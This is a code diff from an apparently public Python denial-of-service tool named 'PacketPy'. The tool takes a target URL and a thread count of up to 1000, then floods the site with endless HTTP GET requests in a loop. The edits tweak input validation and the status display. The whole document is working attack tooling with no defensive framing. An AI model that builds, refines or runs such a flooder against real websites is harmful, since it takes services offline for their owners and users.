@@ -27,17 +27,19 @@ input("Press ENTER to continue ")
 print("")
 def dos(target):
     while True:
-            res = requests.get(url)                
+            res = requests.get(url)        
+threads = 20        
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
     while not url.__contains__("http") or not url.__contains__("."):
         print("Please provide a valid URL.")
         url = input("Target URL [https://example.com]: ")
 try:
-    threads = 20
     threads = int(input("Threads [20] [1-1000]:  "))
 except ValueError:
-    threads = 20
+    exit("Error")
+if threads == 0:
+    exit("Minimum [1]")
 clearterminal()
 print("-----------------------------------------")
 print("")
@@ -46,7 +48,6 @@ print("")
 print("")
 print("- Target URL: " + str(url)+ " -")
 print("- HTTP Payload size: Random")
-print("- Threads: " + str(threads))
 print("- OS: " + str(os.name) + " -")
 print("- PacketPy version: " + str(version) + " -")
 print("")
